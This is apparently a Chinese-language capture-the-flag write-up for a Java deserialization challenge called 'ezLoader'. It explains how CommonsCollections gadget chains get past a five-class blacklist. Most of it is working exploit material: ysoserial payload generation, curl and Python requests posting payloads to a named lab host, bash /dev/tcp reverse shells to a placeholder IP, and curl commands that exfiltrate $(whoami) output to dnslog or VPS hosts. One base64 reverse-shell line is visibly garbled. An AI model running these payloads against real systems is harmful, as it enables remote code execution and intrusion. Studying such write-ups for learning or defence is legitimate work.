# HITCTF - ezLoader 解题说明

## 题目分析

这是一道 Java 反序列化题目，核心代码：

```java
ObjectInputStream ois = new SecureObjectInputStream(
    new ByteArrayInputStream(Base64.getDecoder().decode(data.getBytes()))
);
return ois.readObject().toString();
```

### 黑名单过滤

`SecureObjectInputStream` 只过滤了 5 个类：

- `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`
- `com.fasterxml.jackson.databind.node.POJONode`
- `javax.management.BadAttributeValueExpException`
- `javax.swing.event.EventListenerList`
- `java.security.SignedObject`

## 漏洞利用

### 绕过方式

使用 **CommonsCollections** 链可以完全绕过黑名单，因为其关键类都不在过滤列表中：

- `org.apache.commons.collections.functors.InvokerTransformer`
- `org.apache.commons.collections.map.TransformedMap`
- `org.apache.commons.collections.keyvalue.TiedMapEntry`
- `java.util.HashMap`

### 可用的链

- ✅ CommonsCollections1
- ✅ CommonsCollections2
- ✅ CommonsCollections3
- ✅ CommonsCollections4
- ✅ CommonsCollections5
- ✅ CommonsCollections6 (推荐，最稳定)
- ✅ Jdk7u21

## 使用方法

### 1. 准备工具

下载 ysoserial：
```bash
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
mv ysoserial-all.jar ysoserial.jar
```

### 2. 运行EXP

```bash
# 交互式使用
python exp.py

# 直接执行命令
python exp.py "whoami"

# 反弹shell
python exp.py "bash -c 'bash -i >& /dev/tcp/YOUR_IP/9999 0>&1'"
```

### 3. 常用Payload

#### 测试命令执行
```bash
curl http://xxx.dnslog.cn
whoami
id
```

#### 反弹shell
```bash
# 在VPS上监听
nc -lvnp 9999

# 使用EXP选项2，或手动生成
bash -c 'bash -i >& /dev/tcp/YOUR_IP/9999 0>&1'
```

#### Base64编码绕过
```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQLzk999 0>&1|base64 -d|bash
```

## 手动利用步骤

### 1. 生成Payload

```bash
java -jar ysoserial.jar CommonsCollections6 "whoami" > payload.ser
```

### 2. Base64编码

```bash
cat payload.ser | base64 -w 0 > payload.b64
```

### 3. 发送请求

```bash
curl -X POST http://5bd9497ae8ad.target.yijinglab.com/unser \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "data=$(cat payload.b64)"
```

或使用 Python：

```python
import requests
import base64

with open('payload.ser', 'rb') as f:
    payload = base64.b64encode(f.read()).decode()

r = requests.post(
    'http://5bd9497ae8ad.target.yijinglab.com/unser',
    data={'data': payload}
)
print(r.text)
```

## 调试技巧

### 本地测试

1. 搭建本地环境测试 payload
2. 使用 `SerializationDumper` 查看序列化数据
3. 使用 JD-GUI 分析依赖库版本

### 无回显利用

- DNSlog 外带: `curl http://$(whoami).xxx.dnslog.cn`
- HTTP 外带: `curl http://VPS_IP:8000/$(whoami)`
- 写文件: `echo success > /tmp/pwned`

## 常见问题

### Q1: 提示找不到 ysoserial.jar
下载到EXP同目录即可

### Q2: CommonsCollections 版本问题
- CC1-CC4 需要 commons-collections 3.x
- CC5-CC6 需要 commons-collections 3.x 或 4.x

### Q3: 无法反弹shell
- 检查防火墙
- 使用 Base64 编码绕过特殊字符
- 尝试 DNS 外带确认RCE

## 相关资源

- [ysoserial](https://github.com/frohoff/ysoserial)
- [Java反序列化漏洞原理](https://xz.aliyun.com/t/7031)
- [CommonsCollections利用链分析](https://xz.aliyun.com/t/10307)
